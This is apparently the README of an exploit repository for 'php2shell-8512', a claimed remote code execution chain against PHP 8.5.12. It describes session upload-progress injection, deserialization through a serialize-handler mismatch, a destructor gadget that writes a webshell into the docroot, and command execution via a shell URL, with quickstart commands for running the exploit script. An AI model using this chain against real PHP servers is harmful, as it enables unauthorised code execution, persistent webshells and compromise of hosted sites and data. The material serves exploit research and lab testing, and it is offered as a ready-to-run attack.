# php2shell-8512 — one-shot RCE on fully-patched PHP 8.5.12

Working RCE against **PHP 8.5.12** (the 2026-10-21 security release that fixed
CVE-2026-109618/109619). Pure logic bug — no memory corruption, ASAN-clean,
orthogonal to the CVE-2026-109618/19 class. Receipt: `uid=33(www-data)` over
HTTP, one-shot and interactive; 33s demo video included.

Chain (session-gaps family):

```
1. POST multipart: PHP_SESSION_UPLOAD_PROGRESS = 'inj|O:14:"DeferredWriter":…'
   → the rfc1867 hook writes the RAW field value into the session key
     BEFORE any script runs (ext/session/session.c:3267, no grammar
     validation); write side php_serialize ⇒ the poisoned key persists
2. GET /legacy.php (ini_set handler=php) ⇒ the `php` decoder reads the
   php_serialize file, the poisoned key lands at a VALUE position ⇒
   unserialize ⇒ attacker object; "Session has been destroyed" fires —
   but the destruction itself runs the attacker's __destruct
3. DeferredWriter::__destruct writes a webshell into the docroot
4. GET /p2s_8512_shell.php?c=<cmd> ⇒ RCE
```

## Preconditions (honest)

- `session.serialize_handler` read/write mismatch: write = php_serialize
  (ini/vhost/per-dir — the *recommended* config), read = php (legacy shim /
  app `ini_set`). A real-world pattern, not a contrived one.
- A destructor gadget in victim code (here: a cache-writer class whose
  `__destruct` does `file_put_contents`) — common in real apps.
- `session.upload_progress.enabled=On` (default), `cleanup=Off` in this lab
  (the all-stock `cleanup=On` variant works via a slow-upload race — see the
  jackalsyn php2shell-zeros receipts; not ported here).
- `session.use_strict_mode=On` is handled (the tool takes a server-issued SID).

## Quickstart

```bash
docker run -d --name vic --network <net> --network-alias vic \
  -v "$PWD/victim/php.ini:/usr/local/etc/php/conf.d/zz-victim.ini:ro" \
  -v "$PWD/victim/html:/var/www/html" p2s-official:8.5.12
docker exec vic sh -c 'mkdir -p /var/www/sess; chmod 1777 /var/www/sess;
  chown -R www-data:www-data /var/www/sess /var/www/html'
python3 exploit/php2shell_8512.py vic 80              # interactive shell
python3 exploit/php2shell_8512.py vic 80 --cmd 'id'   # one-shot
python3 exploit/php2shell_8512.py vic 80 --inject-only  # phase 1 alone
```
(`p2s-official:8.5.12` = PHP 8.5.12 built with the upstream docker-library
configure line — any stock Apache+mod_php 8.5.12 works.)

## Demo

[`demo/php2shell-8512-demo.mp4`](demo/php2shell-8512-demo.mp4) — 33s, 1600×900:
victim on the recommended config → clean session file → phase 1 (inject-only,
pre-script) → `od` dump of the poisoned key → phase 2 (trigger) → webshell →
interactive `id`/`uname -a`/`hostname` → verdict frame with preconditions.

## Credits & status

Technique family: Zero1 "session-gaps" from jackalsyn's php2shell-zeros
(2026-10-21, receipts public; gaps first named publicly by the Wiz disclosure
companion repo). This implementation is ours; every claim was re-verified
independently (3/3 of the package's testable claims reproduced in our lab).
Class known upstream under the GH-20001 umbrella; serialize_handler-mismatch
object injection is an old public technique (mid-2010s). No CVE filed for the
surviving gaps as of 2026-10-22.

For authorised testing / lab use only.
